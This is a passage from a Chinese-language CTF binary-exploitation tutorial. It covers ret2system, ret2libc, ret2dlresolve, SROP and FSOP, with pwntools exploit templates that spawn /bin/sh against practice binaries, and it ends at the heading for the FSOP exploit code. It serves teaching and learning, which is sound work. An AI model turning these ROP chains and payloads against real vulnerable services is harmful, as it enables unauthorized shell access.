<p>我们可以这样构造payload，直接调用system，然后通过<code>pop rdi ; ret</code>把<code>&quot;/bin/sh&quot;</code>字符串作为参数传递给它：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./challenge&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">bin_sh = p64(<span class="number">0x400808</span>)	<span class="comment">#&quot;/bin/sh&quot;字符串的地址</span></span><br><span class="line"></span><br><span class="line">ret = p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;ret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">system = p64(elf.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + pop_rdi + bin_sh + ret + system</span><br><span class="line"><span class="comment"># ret是为了栈对齐，有些时候需要加，有些时候不需要，看具体程序</span></span><br></pre></td></tr></table></figure>
<p>如果没有<code>&quot;/bin/sh&quot;</code>，<code>&quot;sh&quot;</code>也可以拿来用。在大部分情况下这两个字符串作为传递给<code>system</code>的参数在功能上是没有区别的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>))))</span><br><span class="line">sh = p64(<span class="built_in">next</span>(elf.search(<span class="string">b&#x27;sh&#x27;</span>)))</span><br><span class="line">ret = p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;ret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>))))</span><br><span class="line">system = p64(elf.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + pop_rdi + sh + ret + system</span><br></pre></td></tr></table></figure>
<p><br></p>
<p><strong>2. 假设程序里有<code>system</code>函数，<code>pop rdi ; ret</code>这个gadget，以及一个写入的函数（比如说gets，read，scanf等）</strong>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./challenge&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_add = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">gets_add = elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"><span class="comment"># 为了防止覆盖 .bss 开头的关键变量，通常建议加一个偏移量，比如 +0x100</span></span><br><span class="line">data_add = elf.bss() + <span class="number">0x100</span> </span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span>*offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将data块的地址作为参数传递给gets函数并调用gets</span></span><br><span class="line"><span class="comment"># 将&quot;/bin/sh&quot;写入data块</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(data_add)</span><br><span class="line">payload += p64(gets_add)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二轮ROP</span></span><br><span class="line"><span class="comment"># 将刚写入的data里的&quot;/bin/sh&quot;作为参数传递给system()函数</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(data_add)</span><br><span class="line">payload += p64(sys_add)</span><br></pre></td></tr></table></figure>
<h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a><strong>ret2libc</strong></h4><p><strong>ret2libc</strong>（<strong>Return-to-Library</strong>）指的是：<br>在存在栈溢出等漏洞、但<strong>无法直接执行注入的shellcode</strong>（通常因为<strong>DEP/NX</strong>保护禁止在栈上执行代码）的情况下，攻击者将程序的控制流劫持到<code>libc</code>库中的现成函数/字符串，比如 <code>system()</code>、<code>/bin/sh</code>，从而达到执行任意命令的目的。</p>
<p>因为需要利用libc的函数，所以一般攻击流程分为2步：</p>
<ol>
<li><p><strong>泄露libc基址</strong></p>
</li>
<li><p><strong>利用libc基址计算所需函数/gadget的正确地址并构造ROP链</strong></p>
</li>
</ol>
<p><br></p>
<p><strong>1. 假如服务器关闭了ASLR，那么就可以直接爆破libc的基址：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.41.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> libc_base <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7ffff7dff000</span>,<span class="number">0x7ffff7d00000</span>,-<span class="number">0x1000</span>):</span><br><span class="line">    </span><br><span class="line">    system_addr = libc_base  + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr  = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    rop_libc  = ROP(libc)</span><br><span class="line">    pop_rdi  = libc_base + rop_libc.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>]).address</span><br><span class="line">    ret = libc_base + rop_libc.find_gadget([<span class="string">&#x27;ret&#x27;</span>]).address</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x58</span></span><br><span class="line">    payload += p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)</span><br></pre></td></tr></table></figure>
<p><code>ret</code>需要看情况，因为有栈对齐的问题，所以有些时候需要加有些时候不需要。</p>
<p><br></p>
<p><strong>2. 正常开启ASLR的情况：</strong></p>
<p>一般情况是通过先泄露某个函数的实际地址，然后通过这个地址计算libc的实际base地址，最后再计算其他所需的地址。</p>
<p>例子：（假设泄露出了<code>prinft</code>的实际地址）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.41.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base   = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_addr = libc_base  + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr  = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">rop_libc= ROP(libc)</span><br><span class="line">g_pop = rop_libc.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>, <span class="string">&#x27;ret&#x27;</span>])</span><br><span class="line">g_ret = rop_libc.find_gadget([<span class="string">&#x27;ret&#x27;</span>])</span><br><span class="line">POP_RDI = libc_base + g_pop.address</span><br><span class="line">RET     = libc_base + g_ret.address</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x58</span></span><br><span class="line">payload += p64(POP_RDI) + p64(binsh_addr) + p64(RET) + p64(system_addr)</span><br></pre></td></tr></table></figure>
<h4 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a><strong>ret2dlresolve</strong></h4><p><strong>ret2dlresolve</strong> 是一种利用 Linux 动态链接器（Dynamic Linker）的<strong>延迟绑定（Lazy Binding）</strong>机制来劫持程序控制流的技术。</p>
<p><strong>核心优势</strong>： <strong>不需要泄露 libc 基址</strong>。即便服务器开启了 ASLR，只要程序没有开启 <strong>Full RELRO</strong>（即开启了延迟绑定），且我们有一个可控的栈溢出和一块已知地址的可写内存（如 <code>.bss</code>），我们就可以利用这个技术伪造解析请求，让动态链接器帮我们“解析”出 <code>system</code> 函数的地址并直接调用。</p>
<p><strong>原理简述：</strong></p>
<p>回顾<strong>背景知识</strong>中提到的延迟绑定过程： 当程序第一次调用 <code>printf@plt</code> 时，最终会调用 <code>_dl_runtime_resolve(link_map, reloc_index)</code>。</p>
<ul>
<li><strong><code>link_map</code></strong>：链表结构的指针，包含库的信息。</li>
<li><strong><code>reloc_index</code></strong>（在32位是偏移，64位是索引）：用于在重定位表（<code>.rel.plt</code> / <code>.rela.plt</code>）中找到修正信息。</li>
</ul>
<p>正常流程是：</p>
<ol>
<li>链接器根据 <code>reloc_index</code> 找到重定位表项。</li>
<li>根据表项中的索引找到符号表（Symbol Table）项。</li>
<li>根据符号表项中的索引找到字符串表（String Table）中的函数名（如 “printf”）。</li>
<li>链接器去 libc 里查找 “printf”，算出实际地址，填回 GOT 表并调用。</li>
</ol>
<p><strong>漏洞利用点：</strong> <code>_dl_runtime_resolve</code> 极其“信任”传入的 <code>reloc_index</code>。 如果我们传入一个<strong>非常大的、精心计算的 <code>reloc_index</code></strong>，使其越界指向我们自己在 <code>.bss</code> 段伪造的数据结构：</p>
<ol>
<li><strong>伪造的重定位表项</strong> -&gt; 指向伪造的符号表项。</li>
<li><strong>伪造的符号表项</strong> -&gt; 指向伪造的字符串（内容为 “system”）。</li>
</ol>
<p>那么链接器就会地去libc里查找 “system”并调用它。</p>
<p>手动构造 <code>ret2dlresolve</code> 的 payload 非常麻烦，尤其是在 64 位环境下，还需要处理复杂的结构体对齐和版本检查问题。不过好在pwntools里有现成的payload构造函数<code>Ret2dlresolvePayload</code>。</p>
<p><strong>Exploit模板：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./challenge&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 确定一个可写且已知地址的区域，通常用 .bss + 偏移</span></span><br><span class="line"><span class="comment"># 确保这个区域足够大，用来存放我们伪造的结构体数据</span></span><br><span class="line">rop_addr = elf.bss() + <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 初始化 Ret2dlresolvePayload 对象</span></span><br><span class="line"><span class="comment"># symbol: 我们想要调用的函数</span></span><br><span class="line"><span class="comment"># args: 函数的参数</span></span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="string">&quot;system&quot;</span>, args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 构造 ROP</span></span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 A: 将伪造的数据结构写入 .bss (利用 read 或 gets 等)</span></span><br><span class="line"><span class="comment"># dlresolve.data_addr 是 pwntools 自动计算出的存放伪造数据的地址</span></span><br><span class="line"><span class="comment"># dlresolve.payload 包含了所有伪造的表项和字符串</span></span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr, <span class="built_in">len</span>(dlresolve.payload))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 B: 调用 ret2dlresolve</span></span><br><span class="line"><span class="comment"># 这会自动生成调用 plt[0] 以及传递伪造 index 的 ROP 链</span></span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 发送 Payload</span></span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的 padding 视题目具体的溢出偏移而定</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset </span><br><span class="line">payload += raw_rop</span><br><span class="line"><span class="comment"># 注意：这里需要先把 fake data 拼接到后面，或者分两次发送</span></span><br><span class="line"><span class="comment"># 因为上面的 rop.read 会读取这些数据</span></span><br><span class="line">payload += dlresolve.payload </span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a><strong>SROP</strong></h4><p><strong>SROP (Sigreturn Oriented Programming)</strong> 的核心在于利用Linux内核的一个机制：系统调用<strong><code>rt_sigreturn</code> (Syscall number 15)</strong>。</p>
<p>什么是 <code>rt_sigreturn</code>？</p>
<p>当Linux进程处理信号（Signal）时，内核会把当前所有的寄存器状态（Context）保存到栈上，形成一个 <code>SigreturnFrame</code>，然后去执行信号处理函数。 当处理函数执行完，程序需要恢复原来的状态，就会调用 <code>rt_sigreturn</code>。</p>
<ul>
<li><strong>重点</strong>：<code>rt_sigreturn</code> 会<strong>无脑地</strong>从栈上读取数据，并把它们<strong>填回 CPU 的所有寄存器</strong>（RIP, RSP, RDI, RSI, RAX, …）。</li>
</ul>
<p>所以当我们手动伪造一个<code>SigreturnFrame</code>放在栈上，然后强行触发<code>syscall 15</code>，内核就会把我们要执行的恶意参数（比如 <code>execve(&quot;/bin/sh&quot;)</code>）全部加载进寄存器。</p>
<p><br></p>
<p>我们来看一个简单的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; [1] Leak Stage</span><br><span class="line">    ; write(1, rsp, 8)</span><br><span class="line">    mov rax, 1          ; syscall: sys_write</span><br><span class="line">    mov rdi, 1          ; fd: stdout</span><br><span class="line">    mov rsi, rsp        ; buf: rsp (当前栈顶)</span><br><span class="line">    mov rdx, 8          ; count: 8 bytes</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">vuln_read:</span><br><span class="line">    ; [2] Overflow Stage</span><br><span class="line">    ; read(0, rsp, 500)</span><br><span class="line">    mov rax, 0          ; syscall: sys_read</span><br><span class="line">    xor rdi, rdi        ; fd: stdin</span><br><span class="line">    mov rsi, rsp        ; buf: rsp (写回栈顶)</span><br><span class="line">    mov rdx, 500        ; count: 500 bytes (足够大，容纳 Frame)</span><br><span class="line">    syscall</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
<p>程序首先会直接泄露<code>rsp</code>的内容（栈顶地址），而程序会将<code>rsp</code>指针所指位置的的8个字节当成返回地址。所以执行<code>ret</code>命令时，程序会返回（跳转）到<code>rsp</code>指针所指位置，并且将<code>rsp</code>的值+8（<code>rsp</code>+=8）。</p>
<p>我们分2步进行：</p>
<p>1. Payload A: 布置好假的 Frame，并让程序重新执行一次 <code>read</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------+  &lt;-- 栈顶 (RSP) (栈的最低地址)</span><br><span class="line">|       Read_Addr       |  &lt;-- 指向代码段里vuln_read的部分的地址(程序会把这里的内容当成返回地址)</span><br><span class="line">+-----------------------+</span><br><span class="line">|           0			|  &lt;-- 任意padding。</span><br><span class="line">+-----------------------+</span><br><span class="line">|                       |</span><br><span class="line">|  Fake SigreturnFrame  |  &lt;-- 伪造的寄存器表</span><br><span class="line">|  (RAX=59, RDI=sh_addr)|      (包含 /bin/sh 字符串)</span><br><span class="line">|                       |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure>
<p>2. Payload B: 仅仅为了控制 <code>RAX</code> 的值变成15，并触发 <code>syscall</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------+</span><br><span class="line">|       Read_Addr       | </span><br><span class="line">+-----------------------+  &lt;-- 栈顶 (RSP) - 覆盖了 Payload A 的前 15 字节</span><br><span class="line">|  Syscall_Ret_Addr     |  &lt;-- syscall; ret 的地址，对应上一轮中0的位置。(8 字节)</span><br><span class="line">+-----------------------+</span><br><span class="line">|  Padding (7 bytes)    |  &lt;-- 7 字节填充</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure>
<p>因为fake SigreturnFrame的前7位没有什么重要内容，所以被padding覆盖了也不影响。</p>
<p>第二轮执行结束后，因为程序读取了15个字节，所以rax的值会被设置成15，此时stack的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------+  &lt;-- 栈顶 (RSP)</span><br><span class="line">|                       |</span><br><span class="line">|  Fake SigreturnFrame  |  &lt;-- 伪造的寄存器表</span><br><span class="line">|  (RAX=59, RDI=sh_addr)|      (包含 /bin/sh 字符串)</span><br><span class="line">|                       |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure>
<p>也就是说，此时的 CPU 状态是：</p>
<ul>
<li><code>RIP</code>：指向 <code>syscall</code> 指令。</li>
<li><code>RAX</code>：15 (<code>sys_rt_sigreturn</code>)。</li>
<li><code>RSP</code>：指向Fake Frame的开头。</li>
</ul>
<p>所以程序会执行<code>sys_rt_sigreturn</code>，并且把我们的Fake Frame当成正常的SigreturnFrame，并且安装frame的内容重新设置寄存器的值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./challenge&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./challenge&#x27;</span>)</span><br><span class="line"></span><br><span class="line">vuln_read = elf.symbols[<span class="string">&#x27;vuln_read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">rop = ROP(elf)</span><br><span class="line">syscall_ret = rop.find_gadget([<span class="string">&#x27;syscall&#x27;</span>, <span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">f&quot;Stack Address: <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">59</span>              <span class="comment"># execve</span></span><br><span class="line">frame.rdi = stack_addr + <span class="number">8</span> + <span class="number">8</span> + <span class="number">40</span> <span class="comment"># 计算字符串地址</span></span><br><span class="line"><span class="comment"># 40是r8寄存器相对于Frame开头的距离 (Offset 0x28)。</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_ret     <span class="comment"># 最后执行 syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字符串放入不重要的寄存器 r8</span></span><br><span class="line">frame.r8 = u64(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload_a = flat([</span><br><span class="line">    vuln_read,       <span class="comment"># ret 跳转回 read</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="built_in">bytes</span>(frame)     <span class="comment"># 紧接着放 Frame</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">p.send(payload_a)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">payload_b = flat([</span><br><span class="line">    syscall_ret,     <span class="comment"># 8 bytes</span></span><br><span class="line">    <span class="string">b&#x27;A&#x27;</span> * <span class="number">7</span>         <span class="comment"># 7 bytes padding</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">p.send(payload_b)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a><strong>FSOP</strong></h4><p><strong>FSOP (File Stream Oriented Programming，面向文件流的编程)</strong> 的核心在于劫持GLIBC中的标准输入输出流结构体：<strong><code>_IO_FILE</code></strong>。</p>
<p><strong>什么是 <code>_IO_FILE</code>？</strong></p>
<p>在 Linux 中，每一个文件流（如 <code>stdin</code>, <code>stdout</code>, <code>stderr</code> 或你用 <code>fopen</code> 打开的文件）在底层都对应一个 <code>_IO_FILE</code> 结构体。为了实现多态，这个结构体的末尾包含一个名为 <strong><code>vtable</code></strong> 的虚函数表指针。 当程序执行 <code>fread</code>, <code>fwrite</code>, <code>fclose</code> 等操作时，它并不会直接调用某个固定函数，而是通过 <code>vtable</code> 找到对应的函数指针并跳转执行。</p>
<p>在 GLIBC 2.24 版本之前，系统不会对 <code>vtable</code> 的合法性进行任何检查。只要我们能控制 <code>_IO_FILE</code> 结构体的内容，就能通过修改 <code>vtable</code> 指针，让程序在执行文件操作（如 <code>fclose</code>）时，跳转到我们的 <code>getshell</code> 函数。</p>
<p>我们来看一个简单的例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  buf[<span class="number">0</span>] = (<span class="type">char</span> *)getshell; <span class="comment">// 预留跳转目标</span></span><br><span class="line">  fp = (FILE *)buf;          <span class="comment">// 强制类型转换，buf 被当做 FILE 结构体</span></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x820u</span>);      <span class="comment">// 漏洞点：控制 buf 的内容</span></span><br><span class="line">  fclose(fp);                <span class="comment">// 触发点：调用 vtable 中的函数指针</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序将 <code>buf</code> 强制转换为了 <code>FILE *</code> 指针。这意味着当我们执行 <code>fclose(fp)</code> 时，系统会从 <code>buf</code> 开始解析 <code>_IO_FILE</code> 结构体。</p>
<p><strong>布局思路</strong>：</p>
<p>在 64 位系统中，<code>_IO_FILE</code> 结构体的长度大约是 <code>0xD8</code> 字节。我们需要在 <code>buf</code> 中布置以下关键数据：</p>
<ol>
<li><strong><code>_flags</code> (Offset 0x0)</strong>：设置为安全值（如 <code>0xfbad208b</code> 或 <code>0</code>），防止 <code>fclose</code> 逻辑提前终止。</li>
<li><strong><code>_lock</code> (Offset 0x88)</strong>：GLIBC 2.23 的 <code>fclose</code> 会触发加锁操作。我们需要让这个指针指向一块内容全为 <code>\x00</code> 的可写内存（如 <code>buf + 0x10</code>），否则程序会崩溃。</li>
<li><strong><code>vtable</code> (Offset 0xd8)</strong>：这是重中之重。我们将它指向我们伪造的虚表地址（如 <code>buf + 0x100</code>）。</li>
<li><strong>Fake Vtable (Offset 0x100)</strong>：在虚表的偏移 <code>0x10</code> 处填入 <code>getshell</code> 地址。因为 <code>fclose</code> 会调用 <code>vtable</code> 中的 <code>_IO_FINISH</code>（位于虚表第三项）。</li>
</ol>
<p><strong>Payload 布局如下：</strong></p>
<p>Plaintext</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------+  &lt;-- buf 起始地址 (fp 指向这里)</span><br><span class="line">|       _flags          |  &lt;-- 8 字节 (0xfbad208b)</span><br><span class="line">+-----------------------+</span><br><span class="line">|       Padding         |  </span><br><span class="line">+-----------------------+  &lt;-- buf + 0x88</span><br><span class="line">|        _lock          |  &lt;-- 指向 buf+0x10 (确保该处为 0)</span><br><span class="line">+-----------------------+</span><br><span class="line">|       Padding         |</span><br><span class="line">+-----------------------+  &lt;-- buf + 0xd8</span><br><span class="line">|       vtable          |  &lt;-- 指向虚表起始地址 (buf + 0x100)</span><br><span class="line">+-----------------------+</span><br><span class="line">|       ......          |</span><br><span class="line">+-----------------------+  &lt;-- buf + 0x100 (Fake Vtable 开始)</span><br><span class="line">|       dummy           |  &lt;-- 8 字节</span><br><span class="line">+-----------------------+</span><br><span class="line">|       dummy           |  &lt;-- 8 字节</span><br><span class="line">+-----------------------+  &lt;-- buf + 0x110 (vtable + 0x10)</span><br><span class="line">|      getshell         |  &lt;-- 这里是 _IO_FINISH，程序会跳转到这里</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure>
<p><strong>Exploit 代码实现</strong></p>
